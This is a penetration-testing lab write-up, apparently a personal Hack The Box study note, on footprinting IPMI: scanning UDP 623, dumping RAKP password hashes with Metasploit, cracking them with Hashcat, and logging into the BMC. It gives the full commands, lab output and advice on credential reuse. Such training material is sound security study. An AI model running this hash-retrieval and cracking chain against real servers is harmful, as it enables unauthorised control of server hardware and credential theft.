# IPMI — Footprinting
**Port(s):** 623 UDP
**Protocol:** UDP
**CPTS Module:** Footprinting | **Date:** March 2026

## What IPMI Is and Why Pentesters Care

IPMI (Intelligent Platform Management Interface) is a hardware-level management interface implemented via a BMC (Baseboard Management Controller) on servers. It allows remote power control, hardware monitoring, and KVM access completely independent of the host operating system — meaning even if the OS is offline, IPMI still responds. Common vendors include HP iLO, Dell iDRAC, and Supermicro IPMI.

From a pentesting perspective IPMI is valuable for one critical reason: a flaw in IPMI 2.0 allows retrieval of HMAC-SHA1 password hashes for any configured user without knowing the password. These hashes are then cracked offline with Hashcat. Because IPMI typically controls server power and remote console access, weak credentials on a BMC are treated as a critical finding in any engagement — an attacker with IPMI access can power off servers, modify boot settings, or access the full console without touching the OS.

## Key IPMI Facts

| Feature | Detail |
|---|---|
| Default Port | 623 UDP |
| Layer | Below OS — talks directly to BMC firmware |
| Typical vendors | HP iLO, Dell iDRAC, Supermicro IPMI |
| Critical flaw | IPMI 2.0 RAKP allows hash retrieval without knowing the password |
| Hash format | IPMI 2.0 RAKP HMAC-SHA1 — Hashcat mode `7300` |

## Enumeration — Step by Step

### Step 1 — Nmap UDP Scan
```bash
sudo nmap -sU -p623 --script ipmi-version 10.129.14.128
```
Must use `-sU` for UDP — TCP scan misses IPMI entirely.

### Step 2 — Metasploit Hash Retrieval
```bash
msfconsole -q
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS 10.129.14.128
run
```

This module exploits the IPMI 2.0 RAKP weakness to retrieve username and password hash pairs without knowing the password. The output provides everything needed for offline cracking.

**Module options:**
- `RHOSTS` — target IP, range, or hosts file
- `RPORT` — default 623 UDP, change if non-standard port

### Step 3 — Crack Hash With Hashcat
```bash
# Hash retrieved from Metasploit output — paste full hash string
hashcat -m 7300 -w 3 -O \
"93c887ae820000...140561646d696e:3541221b...7fd8" \
/usr/share/wordlists/rockyou.txt

# Or save hash to file first
echo "93c887ae820000...140561646d696e:3541221b...7fd8" > ipmi.hash
hashcat -m 7300 -w 3 -O ipmi.hash /usr/share/wordlists/rockyou.txt
```

**Flag breakdown:**
- `-m 7300` — hash mode: IPMI2 RAKP HMAC-SHA1
- `-w 3` — workload profile 3 (aggressive, faster cracking)
- `-O` — optimized kernel for performance boost
- `/usr/share/wordlists/rockyou.txt` — standard wordlist

**Cracked output format:**
```
<hash_blob>:<HMAC>:<cleartext_password>
```

The cleartext password is the last field after the final colon.

### Step 4 — Connect With Recovered Credentials
After cracking, use the credentials to access the BMC web interface directly:
```
https://10.129.14.128
Username: admin
Password: trinity
```
From here you have remote power control, hardware sensors, and potentially KVM console access.

## Common Misconfigurations

| Misconfiguration | Why It Is Dangerous | Attack Path |
|---|---|---|
| IPMI 2.0 enabled (default) | RAKP flaw allows hash retrieval without password | Metasploit ipmi_dumphashes retrieves hash directly |
| Weak or default BMC password | Hash cracks quickly against rockyou | Hashcat mode 7300 recovers cleartext password |
| BMC accessible from network | Any host can query IPMI | No network segmentation required to attack |
| Same password reused on OS | Cracked BMC password works on SSH/RDP | Credential reuse across all services on the host |
| Admin account with full BMC access | Power control + console access | Attacker can power off servers or modify boot |

## Real Lab Output
```
Hackerpatel007_1@htb[/htb]$ msfconsole -q

msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set RHOSTS 10.129.14.128
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.14.128:623 - IPMI - Hash found: admin:93c887ae8200000052f17511d0fd3b9a08350b045e118a2cd0c311777576080bc13a5581d522cdb5a123456789abcdefa123456789abcdef140561646d696e:3541221bac8d7e76f34e45697aed40edfbe87fd8
[*] Scanned 1 of 1 hosts (100% complete)

Hackerpatel007_1@htb[/htb]$ hashcat -m 7300 -w 3 -O ipmi.hash /usr/share/wordlists/rockyou.txt

93c887ae8200000052f17511...140561646d696e:3541221bac8d7e76f34e45697aed40edfbe87fd8:trinity

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 7300 (IPMI2 RAKP HMAC-SHA1)
```

## What I Learned / What Surprised Me

The fact that IPMI hands over the password hash without requiring you to know the password first was something I genuinely did not expect. Every other service we have covered requires at least a username and password attempt — IPMI 2.0 just gives you the hash through the RAKP handshake before any authentication completes. The implication is also significant: IPMI access means power control over physical servers, which is a level of access that bypasses everything the OS-level security team has done. Credential reuse is also worth noting here — a cracked BMC password should immediately be tested against every other service on that host because administrators frequently reuse the same password across IPMI, SSH, and web interfaces on the same machine.


## Commands Reference

| Command | Purpose |
|---|---|
| `nmap -sU -p623 --script ipmi-version <IP>` | Detect IPMI and version |
| `use auxiliary/scanner/ipmi/ipmi_dumphashes` | Metasploit module for hash retrieval |
| `set RHOSTS <IP>` | Set target in Metasploit |
| `hashcat -m 7300 -w 3 -O <hash> rockyou.txt` | Crack IPMI RAKP HMAC-SHA1 hash |
| `hashcat -m 7300 --restore` | Resume interrupted cracking session |
